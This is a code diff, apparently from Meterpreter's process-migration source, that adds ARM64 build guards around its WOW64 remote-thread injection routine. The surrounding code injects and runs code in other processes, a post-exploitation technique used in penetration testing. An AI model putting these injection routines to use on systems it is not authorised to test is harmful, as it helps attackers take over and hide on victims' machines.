@@ -372,6 +372,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
  *       threads (kernel32!CreateThread will return ERROR_NOT_ENOUGH_MEMORY). Because of this we filter out
  *       Windows 2003 from this method of injection, however the APC injection method will work on 2003.
  */
+#ifndef _M_ARM64
 DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE * pThread )
 {
 	DWORD dwResult           = ERROR_SUCCESS;
@@ -449,6 +450,7 @@ DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPV
 
 	return dwResult;
 }
+#endif // _M_ARM64
 
 /*
  * Attempte to gain code execution in the remote process by creating a remote thread in the target process.
@@ -465,17 +467,19 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
 		// fails, giving us a chance to try an alternative method or fail migration gracefully.
 		hThread = create_remote_thread(hProcess, 1024 * 1024, lpStartAddress, lpParameter, CREATE_SUSPENDED, NULL);
 		if (!hThread)
-		{
-			if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
 			{
-				dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;
-
-				if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
+				#ifndef _M_ARM64
+				if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
 				{
-					BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
+					dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;
+
+					if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
+					{
+						BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
+					}
 				}
-			}
-			else
+				else
+		#endif // _M_ARM64
 			{
 				BREAK_ON_ERROR("[INJECT] inject_via_remotethread: CreateRemoteThread failed")
 			}
